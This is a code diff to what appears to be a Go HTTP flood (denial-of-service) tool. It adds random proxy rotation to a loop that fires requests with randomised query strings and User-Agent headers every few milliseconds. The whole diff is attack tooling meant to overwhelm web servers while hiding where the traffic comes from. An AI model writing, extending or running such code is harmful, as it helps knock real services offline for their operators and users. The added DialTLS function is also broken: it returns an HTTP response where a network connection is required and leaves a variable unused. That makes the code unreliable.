@@ -46,7 +46,7 @@ func buildblock(size int) (s string) {
 	return string(a)
 }
 
-func get() {
+func get(proxyURLs []*url.URL) {
 	if strings.ContainsRune(host, '?') {
 		param_joiner = "&"
 	} else {
@@ -82,11 +82,15 @@ func get() {
 
 	transport := &http2.Transport{
 		AllowHTTP: true,
+		ProxyConnectHeader: http.Header{},
 	}
 
-	c := http.Client{
-		Timeout:   3500 * time.Millisecond,
-		Transport: &http2.Transport{DialTLS: transport.DialTLS},
+	transport.DialTLS = func(network, addr string, cfg *tls.Config) (net.Conn, error) {
+		proxyURL := proxyURLs[rand.Intn(len(proxyURLs))]
+		proxyStr := proxyURL.String()
+		proxy := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+		client := &http.Client{Transport: proxy}
+		return client.Get("https://" + addr)
 	}
 
 	req.Header.Set("User-Agent", uarand.GetRandom())
@@ -122,7 +126,7 @@ func loop() {
 		if atomic.LoadInt32(&stopFlag) == 1 {
 			return
 		}
-		go get()
+		go get(proxyURLs)
 		time.Sleep(10000 * time.Microsecond)
 	}
 }
